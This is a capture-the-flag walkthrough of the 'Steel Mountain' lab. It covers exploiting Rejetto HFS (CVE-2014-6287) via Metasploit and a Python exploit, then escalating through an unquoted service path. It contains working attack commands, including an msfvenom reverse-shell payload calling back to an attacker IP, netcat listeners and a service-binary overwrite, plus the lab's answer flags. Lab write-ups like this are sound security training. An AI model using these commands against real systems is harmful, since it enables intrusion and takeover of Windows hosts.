# STEEL MOUNTAIN

## BASIC INFO

```
export IP=10.10.90.232
```

## INITIAL ACCESS

```
nmap -sV -sC -oN nmap/init $IP -p- -T4
```

> - **Scan the machine with nmap. What is the other port running a web server on?**
>> 8080

> - **Take a look at the other web server. What file server is running?**
>> Rejetto Http File Server

There is a link at the bottom left of the page. Once we click, it redirects  us to rejetto.com and the file server name is HttpFileServer.

> - **What is the CVE number to exploit this file server?**
>> 2014-6287

> - **Use Metasploit to get an initial shell. What is the user flag?**
>> b04763b6fcf51fcd7c13abc7db4fd365

```
msfconsole
use exploit/windows/http/rejetto_hfs_exec
This exploit may require manual cleanup of '%TEMP%\BlJLuM.vbs' on the target
```

## PRIVILAGE ESCALATION

Using a script called [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). It is used to evaluate a Windows machine and determine any abnormalities.

In meterpreter, `upload /opt/PowerShellEXploit/PowerUp.ps1`\
Then run `load powershell` followed by `powershell_shell`\
After we spawned a powershell, enter the command `. .\PowerUp.ps1` and `Invoke-allChecks`

> - **Take close attention to the CanRestart option that is set to true. What is the name of the unquoted service path service name?**
>> AdvancedSystemCareService9

Use msfvenom to generate a reverse shell as an Windows executable.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.8.177 LPORT=9001 -e x86/shikata_ga_nai -f exe -o ASCService.exe
```

Upload it with meterpreter, then run the following command in the windows shell.
```
sc stop AdvancedSystemCareService9
copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
```

Then choose yes when prompt to overwrite the program.

Now we create a listener on our host machine.\
`nc -lnvp 9001`\
Then restart the service with `sc start AdvancedSystemCareSevice9` in the windows shell.\
Now we have access to the machine as root.
```
cd C:\Users\Administrator\Desktop
type root.txt
```

> - **What is the root flag?**
>> 9af5f314f57607c00fd09803a587db80

## ACCESS AND ESCALATION WITHOUT METASPLOIT

Download a static netcat binary from [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe)

Then start a simple http service with python.\
`python3 -m http.server 80`

Then as usual we need to set up a listener.\
`nc -lnvp 9001`

Then using this [exploit](exploit.py), we run the command\
`python exploit.py $IP 8080`

We need to run it twice for it to work. First time it will request the nc.exe from our server then second time we will get a shell on our listener.

> - **What powershell -c command could we run to manually find out the service name?**
>> powershell -c Get-Service

Then we just repeat the same process as above to escalate to admin.